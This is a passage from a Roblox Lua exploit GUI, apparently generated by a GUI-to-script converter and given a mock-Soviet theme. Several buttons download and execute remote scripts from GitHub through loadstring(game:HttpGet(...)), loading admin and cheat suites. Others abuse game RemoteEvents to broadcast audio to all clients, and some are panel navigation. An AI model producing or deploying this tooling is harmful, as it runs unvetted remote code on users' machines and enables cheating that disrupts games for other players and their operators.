		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
	end)
end
coroutine.wrap(CEULJ_fake_script)()
local function PWKLWDI_fake_script() -- FATES.LocalScript 
	local script = Instance.new('LocalScript', FATES)

	local button = script.Parent
	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))(); 
	end)
end
coroutine.wrap(PWKLWDI_fake_script)()
local function SYBQ_fake_script() -- VHUGS2.LocalScript 
	local script = Instance.new('LocalScript', VHUGS2)

	local button = script.Parent
	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/weebetofbanter/scriptsforblyat/main/djsuka.lua"))(); 
	end)
end
coroutine.wrap(SYBQ_fake_script)()
local function DQRJQQ_fake_script() -- NAKED.LocalScript 
	local script = Instance.new('LocalScript', NAKED)

	local button = script.Parent
	local moscow = "v"
	local redsquare = "i"
	
	button.MouseButton1Down:Connect(function(ChangeOutfit)
		for redsquare,moscow in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if moscow:IsA("Clothing") or moscow:IsA("ShirtGraphic") then
				moscow:Destroy()
			end
		end
	end)
	
end
coroutine.wrap(DQRJQQ_fake_script)()
local function WOFW_fake_script() -- MUSICBLAST.LocalScript 
	local script = Instance.new('LocalScript', MUSICBLAST)

	local button = script.Parent
	local sInfo = 1064109642
	local sukablyat = "ReplicatedStorage"
	
	button.MouseButton1Down:Connect(function(ChangeOutfit)
	local v1 = { { 1 }, { 1 }, { 1 }, { 1 }, { 1 }, { 1 }, { 1 }, { 1 }, { 1 } };
	local l__Audio__2 = workspace:WaitForChild("Audio");
	local v3 = Random.new():NextInteger(1, #v1);
	local l__RE__1 = game:GetService(sukablyat):WaitForChild("RE");
	function playOnClients(p1)
		l__RE__1:FireAllClients("Play", p1);
	end;
	while true do
		wait();
		sInfo = v1[v3];
		l__Audio__2.SoundId = "rbxassetid://" .. tostring(sInfo[1]);
		l__Audio__2:Play();
		local u2 = false;
		local u3 = false;
		local v4 = l__Audio__2.Stopped:Connect(function()
			u3 = true;
		end);
		while true do
			wait();
			if u2 then
				break;
			end;
			if u3 then
				break;
			end;    
		end;
		l__Audio__2.Ended:Connect(function()
			u2 = true;
		end):Disconnect();
		v4:Disconnect();
		v3 = v3 + 1;
		if #v1 < v3 then
			v3 = 1;
		end;
		end;
	end)
	
	script.Parent.MouseButton1Click:Connect(playOnClients)
end
coroutine.wrap(WOFW_fake_script)()
local function ZCWTZH_fake_script() -- RETURN.LocalScript 
	local script = Instance.new('LocalScript', RETURN)

	local SB = script.Parent --Submit Button
	local current = script.Parent.Parent.Parent
	local F = script.Parent.Parent.Parent.Parent.MAIN
	
	SB.MouseButton1Click:Connect(function() --Fires when submit button is clicked
		if F.Visible == false and current.Visible == true then
			wait(0) 
			F.Visible = true
			wait(0)
			current.Visible = false 
		else 
			return 
		end
	end)
end
coroutine.wrap(ZCWTZH_fake_script)()
local function NPMFNIH_fake_script() -- OPENCLOSE.LocalScript 
	local script = Instance.new('LocalScript', OPENCLOSE)

	local button = script.Parent
	local base = script.Parent.Parent
	local load = base.LOADING
	local main = base.MAIN
	local mission = base.MISSION
	local LOGIN = base.LOGIN
	
	script.Parent.MouseButton1Click:Connect(function()
		if main.Visible == false and mission.Visible == true then
			wait(0)
			main.Visible = true
			mission.Visible = false
		elseif main.Visible == true and mission.Visible == false then
			wait(0)
			mission.Visible = true
			main.Visible = false
		end
	end)
end
coroutine.wrap(NPMFNIH_fake_script)()
local function LDZSC_fake_script() -- TextLabel_5.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_5)

	local text = script.Parent.Parent.TextLabel
	local DJBLYATMAN = text.Text
	local LOGINFRAME = script.Parent.Parent.Parent.LOGIN
	local CURRENTFRAME = script.Parent.Parent
	
	if text.Text == "загрузка секретных миссий для Родины. пожалуйста, подождите несколько секунд, пока панель загрузится" then
	wait(3)
	DJBLYATMAN = "жду окна советский Чтобы загрузить, черт возьми, это займет вечность"
	wait(3)
	DJBLYATMAN = "Почти готов, загрузка секретной информации КГБ"
	wait(3)
	
	if CURRENTFRAME.Visible == true and LOGINFRAME.Visible == false then
		wait(0)
		CURRENTFRAME.Visible = false
		wait(0)
		LOGINFRAME.Visible = true
		end
	end
end
coroutine.wrap(LDZSC_fake_script)()
local function HFMQQ_fake_script() -- SLAVPAGES.LocalScript 
	local script = Instance.new('LocalScript', SLAVPAGES)

	frame = script.Parent
	frame.Draggable = true
end
coroutine.wrap(HFMQQ_fake_script)()
local function LDSE_fake_script() -- MUSIC_2.LocalScript 
	local script = Instance.new('LocalScript', MUSIC_2)

	local blyat = script.Parent 
		
	game:GetService("ReplicatedStorage").Events.UpdateSongList:FireServer()
	
end
coroutine.wrap(LDSE_fake_script)()
local function TVFJIK_fake_script() -- RETURN_2.LocalScript 
	local script = Instance.new('LocalScript', RETURN_2)

	local SB = script.Parent --Submit Button
	local current = script.Parent.Parent.Parent
	local F = script.Parent.Parent.Parent.Parent.MAIN
	
	SB.MouseButton1Click:Connect(function() --Fires when submit button is clicked
		if F.Visible == false and current.Visible == true then
			wait(0) 
			F.Visible = true
			wait(0)
			current.Visible = false 
		else 
			return 
		end
	end)
end
coroutine.wrap(TVFJIK_fake_script)()
local function CIQQA_fake_script() -- WRONGMUSIC.LocalScript 
	local script = Instance.new('LocalScript', WRONGMUSIC)

	local button = script.Parent
	local SUKA = script.Parent.Parent.ERRORBLYAT
	
	script.Parent.MouseButton1Click:Connect(function()
		if SUKA.Visible == false then
				SUKA.Visible = true
				wait(3)
				SUKA.Visible = false
		end
	end)
end
coroutine.wrap(CIQQA_fake_script)()
local function RJZALLD_fake_script() -- RUSSIANMUSIC.LocalScript 
	local script = Instance.new('LocalScript', RUSSIANMUSIC)

	local SB = script.Parent --Submit Button
	local current = script.Parent.Parent.Parent
	local F = script.Parent.Parent.Parent.Parent.MAIN
	
	SB.MouseButton1Click:Connect(function() --Fires when submit button is clicked
		if F.Visible == false and current.Visible == true then
			wait(0) 
			F.Visible = true
			wait(0)
			current.Visible = false 
		else 
			return 
		end
	end)
end
coroutine.wrap(RJZALLD_fake_script)()
local function GZIR_fake_script() -- RUSMUSIC.LocalScript 
	local script = Instance.new('LocalScript', RUSMUSIC)

	local blyat = script.Parent 
		
	game:GetService("ReplicatedStorage").Events.UpdateSongList:FireServer()
	
end
coroutine.wrap(GZIR_fake_script)()
local function CIEG_fake_script() -- RETURN_3.LocalScript 
	local script = Instance.new('LocalScript', RETURN_3)

	local SB = script.Parent --Submit Button
	local current = script.Parent.Parent.Parent
	local F = script.Parent.Parent.Parent.Parent.MAIN
	
	SB.MouseButton1Click:Connect(function() --Fires when submit button is clicked
		if F.Visible == false and current.Visible == true then
			wait(0) 
			F.Visible = true
			wait(0)
			current.Visible = false 
		else 
			return 
		end
	end)
end
coroutine.wrap(CIEG_fake_script)()
